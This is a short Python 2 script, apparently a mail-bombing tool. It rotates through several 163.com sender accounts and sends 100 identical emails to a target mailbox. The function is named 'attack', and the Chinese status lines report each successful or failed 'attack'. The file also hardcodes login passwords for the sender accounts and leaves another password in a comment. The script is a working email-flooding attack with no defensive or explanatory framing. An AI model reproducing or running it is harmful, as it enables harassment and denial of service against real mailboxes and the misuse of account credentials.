#!/usr/bin/env python
#coding:utf-8

import smtplib
import random
import time
from email.mime.text import MIMEText  

ISOTIMEFORMAT='%Y-%m-%d %X'

#mailserver info
#pwd='zx199248'
mail_host='smtp.163.com'

def attack(target_list,attack_member,content,num):
    last_memberID=len(attack_member)-1
    attacker=random.randint(0,last_memberID)
    msg=MIMEText(content,_subtype='plain',_charset='gb2312')
    msg['Subject']='MAILTEST'
    msg['From']=attack_member[attacker] 
    msg['To']=';'.join(target_list) 
    try:
        sm=smtplib.SMTP() 
        sm.connect(mail_host)
        if attack_member[attacker]=='123235234@163.com':
            sm.login(attack_member[attacker],'sdfqrqweqw') 
        else:
            sm.login(attack_member[attacker],'sdfweras')
        sm.sendmail(attack_member[attacker],target_list,msg.as_string())
        sm.close()
        print '攻击成功,本次为第%d次攻击,攻击者为%s' %(num,attack_member[attacker])
    except Exception,e:
        print '攻击失败。本次为第%d次攻击,攻击者为%s,失败原因:' %(num,attack_member[attacker]) ,
        print str(e)
        
def main():
    target_list=['weuwo8483@163.com']
    attack_list=['wer231231@163.com','akdkss1230@163.com','sdifh897243@163.com']
    content='this is mailac test'
    num=100
    attacknum=1
    print '开始时间为:', time.strftime( ISOTIMEFORMAT, time.localtime() )
    while num>0:
        attack(target_list, attack_list, content, attacknum)
        num=num-1
        attacknum=attacknum+1
    print '结束时间为:', time.strftime( ISOTIMEFORMAT, time.localtime() )
main()
    
    
    
    
    
    
    
    
    